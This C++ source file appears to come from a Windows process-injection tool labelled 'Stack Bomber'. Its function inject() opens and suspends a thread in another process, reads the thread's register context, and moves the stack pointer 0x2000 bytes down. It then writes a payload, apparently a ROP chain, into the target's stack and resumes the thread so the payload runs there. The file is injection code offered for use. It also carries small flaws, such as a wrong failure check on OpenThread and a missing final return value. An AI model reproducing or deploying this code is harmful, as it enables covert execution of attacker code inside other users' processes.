// Standard Include's
#include <iostream>
#include <map>
#include <string>

// Local Include's
#include "Inject_and_Resume.h"
#include "Rop_Chain.h"
#include "Set_Remote_Memory.h"


// Used for Stack Bomber
#ifdef _M_X64


BOOL inject(DWORD pid, DWORD tid)
{
	TARGET_PROCESS target;
	TStrDWORD64Map runtime_parameters;
	HANDLE t = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
	if (t == INVALID_HANDLE_VALUE)
		return 0;

	SuspendThread(t);
	CONTEXT context;
	context.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(t, &context))
	{
		return 0;
	}
	runtime_parameters["orig_tos"] = (DWORD64)context.Rsp;
	runtime_parameters["tos"] = runtime_parameters["orig_tos"] - 0x2000;

	// Setup Target
	target.thread = t;
	target.tid = tid;

	WritePayload(&target, &runtime_parameters);
	ResumeThread(t);
}

#endif